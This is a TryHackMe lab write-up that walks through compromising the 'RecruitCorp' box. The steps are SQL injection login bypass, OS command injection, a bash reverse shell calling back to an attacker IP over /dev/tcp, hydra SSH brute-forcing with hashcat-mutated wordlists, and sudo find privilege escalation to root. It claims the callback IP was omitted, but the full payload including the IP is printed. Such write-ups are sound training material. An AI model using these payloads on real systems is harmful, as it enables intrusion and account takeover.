# Operation Promotion --- TryHackMe Write-Up

> **Platform:** TryHackMe\
> **Target:** RecruitCorp\
> **Category:** Web Exploitation / Linux Privilege Escalation\
> **Purpose:** Educational lab write-up for authorized TryHackMe
> practice only.

------------------------------------------------------------------------

## Table of Contents

1.  [Initial Enumeration](#1-initial-enumeration)
2.  [Web Directory Enumeration](#2-web-directory-enumeration)
3.  [SQL Injection --- Admin Access](#3-sql-injection--admin-access)
4.  [Command Injection](#4-command-injection)
5.  [Reverse Shell](#5-reverse-shell)
6.  [Application Configuration & Database
    Enumeration](#6-application-configuration--database-enumeration)
7.  [Credential Attack Against SSH](#7-credential-attack-against-ssh)
8.  [Initial SSH Access](#8-initial-ssh-access)
9.  [Privilege Escalation](#9-privilege-escalation)
10. [Attack Chain Summary](#10-attack-chain-summary)
11. [Key Takeaways](#11-key-takeaways)

------------------------------------------------------------------------

## 1. Initial Enumeration

I started by running an Nmap service and default-script scan against the
target.

``` bash
nmap -sC -sV 10.49.148.137
```

### Important Results

``` text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.58
139/tcp open  netbios-ssn Samba smbd
445/tcp open  netbios-ssn Samba smbd
```

The HTTP service identified the application as:

``` text
RecruitCorp - Careers Portal
```

The scan also revealed an interesting `robots.txt` entry:

``` text
/admin/
```

### Interesting Services

  Port   Service       Observation
  ------ ------------- -----------------------------
  22     SSH           Potential remote login
  80     HTTP          RecruitCorp web application
  139    NetBIOS/SMB   Samba exposed
  445    SMB           Samba exposed

------------------------------------------------------------------------

## 2. Web Directory Enumeration

Next, I enumerated web directories and common file extensions with
Gobuster.

``` bash
gobuster dir \
  -u http://10.49.148.137 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,php,html,bak
```

### Useful Results

``` text
/admin          (Status: 301)
/config         (Status: 403)
/index.php      (Status: 200)
/robots.txt     (Status: 200)
/server-status  (Status: 403)
```

The most interesting endpoint was:

``` text
/admin/
```

------------------------------------------------------------------------

## 3. SQL Injection --- Admin Access

The `/admin/` login page was vulnerable to SQL injection.

The payload used in the lab was:

``` text
' or true--
```

Using the injection bypassed the login and provided access to the admin
area.

### Users Visible from the Admin Panel

The panel exposed several application users and roles, including:

``` text
admin       admin
mvasquez    recruiter
tparker     recruiter
lhayes      analyst
kchen       recruiter
rdavis      analyst
sysmaint    system
jbailey     recruiter
aokafor     recruiter
```

A particularly interesting account was `sysmaint`, because its notes
referenced:

``` text
/admin/sysmaint-checks/ping.php
```

------------------------------------------------------------------------

## 4. Command Injection

I visited the following endpoint:

``` text
/admin/sysmaint-checks/ping.php
```

Testing the `host` parameter showed that it was vulnerable to OS command
injection.

### Verification

The lab payload appended a command to the expected host input:

``` text
127.0.0.1;cat /etc/passwd
```

The response included the normal ping output followed by `/etc/passwd`,
confirming command execution.

One useful account discovered in `/etc/passwd` was:

``` text
jford:x:1001:1001::/home/jford:/bin/bash
```

This gave me a valid local username to investigate later.

------------------------------------------------------------------------

## 5. Reverse Shell

After confirming command execution, I started a Netcat listener on my
TryHackMe attack machine:

``` bash
nc -lvnp 4444
```

I then used the vulnerable `host` parameter to execute a Bash reverse
shell.

``` text
http://TARGET/admin/sysmaint-checks/ping.php?host=127.0.0.1%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.49.123.33/4444%200%3E%261%27
```

> The exact callback payload/IP has been omitted from this public
> version.

The listener received a connection:

``` text
Connection received on TARGET <PORT>
www-data@recruitcorp:/var/www/html/admin/sysmaint-checks$
```

I now had shell access as:

``` text
www-data
```

------------------------------------------------------------------------

## 6. Application Configuration & Database Enumeration

From the reverse shell, I explored the web application's files.

``` bash
cd /var/www/html
ls
```

The application contained:

``` text
admin
config
index.php
robots.txt
style.css
```

Inside the configuration directory:

``` bash
cd config
ls
cat db.conf
```

The configuration identified the database and application user.

``` text
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=<REDACTED_BCRYPT_HASH>
db_engine=sqlite3
```

### SQLite Enumeration

I checked the application's SQLite database:

``` bash
sqlite3 /var/lib/recruitcorp/app.db ".tables"
```

Result:

``` text
users
```

I then inspected the schema:

``` bash
sqlite3 /var/lib/recruitcorp/app.db ".schema users"
```

``` sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    role TEXT NOT NULL,
    notes TEXT
);
```

The user table could then be queried:

``` bash
sqlite3 /var/lib/recruitcorp/app.db "SELECT * FROM users;"
```

The database contained application usernames, passwords, roles, and
notes. For a public GitHub write-up, the discovered passwords are
intentionally masked:

``` text
admin       <REDACTED>    admin
mvasquez    <REDACTED>    recruiter
tparker     <REDACTED>    recruiter
lhayes      <REDACTED>    analyst
kchen       <REDACTED>    recruiter
rdavis      <REDACTED>    analyst
sysmaint    <REDACTED>    system
jbailey     <REDACTED>    recruiter
aokafor     <REDACTED>    recruiter
```

I first tried cracking the discovered hash and testing credentials from
the database, but those attempts did not provide the required system
access.

------------------------------------------------------------------------

## 7. Credential Attack Against SSH

From `/etc/passwd`, I already knew that `jford` was a valid Linux user.

``` text
jford:x:1001:1001::/home/jford:/bin/bash
```

A likely password base was identified as:

``` text
spring2026
```

I generated mutations of this base word using Hashcat's `dive.rule`:

``` bash
echo "spring2026" > pass.txt

hashcat --stdout pass.txt \
  -r /usr/share/hashcat/rules/dive.rule \
  > wordlist.txt
```

This generated a large password candidate list.

### SSH Password Testing

I tested the generated wordlist against the `jford` SSH account in the
authorized THM environment:

``` bash
hydra -l jford -P wordlist.txt 10.49.148.137 ssh
```

Hydra identified a valid password:

``` text
login: jford
password: <REDACTED>
```

------------------------------------------------------------------------

## 8. Initial SSH Access

Using the discovered credential, I connected over SSH:

``` bash
ssh jford@10.49.148.137
```

After authentication:

``` bash
id
```

``` text
uid=1001(jford) gid=1001(jford) groups=1001(jford)
```

The user's home directory contained the user flag:

``` bash
ls
cat user.txt
```

``` text
THM{REDACTED_USER_FLAG}
```

------------------------------------------------------------------------

## 9. Privilege Escalation

I checked the user's sudo privileges:

``` bash
sudo -l
```

The important result was:

``` text
User jford may run the following commands on recruitcorp:

(root) NOPASSWD: /usr/bin/find
```

This meant `jford` could execute `/usr/bin/find` as `root` without
supplying a password.

Running `find` normally without `sudo` only created a shell as `jford`,
so it did **not** escalate privileges.

The key was executing the allowed binary through `sudo`:

``` bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

I verified the new shell:

``` bash
id
```

Result:

``` text
uid=0(root) gid=0(root) groups=0(root)
```

Root access was successfully obtained.

I could then access `/root`:

``` bash
cd /root
ls
cat flag.txt
```

``` text
THM{REDACTED_ROOT_FLAG}
```

------------------------------------------------------------------------

## 10. Attack Chain Summary

``` text
Nmap Enumeration
      ↓
Web Enumeration
      ↓
/admin/ Discovered
      ↓
SQL Injection
      ↓
Admin Panel Access
      ↓
sysmaint Endpoint Discovered
      ↓
Command Injection
      ↓
Reverse Shell as www-data
      ↓
Configuration + SQLite Enumeration
      ↓
jford Account Identified
      ↓
Password Candidate Generation
      ↓
SSH Credential Discovered
      ↓
SSH Access as jford
      ↓
sudo -l
      ↓
NOPASSWD /usr/bin/find
      ↓
Root Shell
```

------------------------------------------------------------------------

## 11. Key Takeaways

### Web Enumeration

`robots.txt` and directory brute-forcing revealed the `/admin/` attack
surface.

### SQL Injection

Weak input handling on the admin authentication page allowed
authentication bypass.

### Command Injection

The system-maintenance ping functionality passed user-controlled input
to an operating-system command without sufficient sanitization.

### Credential Discovery

Application configuration and the SQLite database revealed useful
information that helped continue the attack chain.

### Password Reuse / Predictability

A predictable password pattern combined with rule-based mutation enabled
access to the Linux account in the lab.

### Privilege Escalation

The following sudo permission was dangerous:

``` text
(root) NOPASSWD: /usr/bin/find
```

Because `find` can execute commands through `-exec`, allowing it to run
as root enabled a root shell.

------------------------------------------------------------------------

## Disclaimer

This write-up documents exploitation performed inside an **authorized
TryHackMe lab environment**. The techniques shown here should only be
used on systems you own or have explicit permission to test.

------------------------------------------------------------------------

**Room:** Operation Promotion\
**Platform:** TryHackMe\
**Status:** Completed
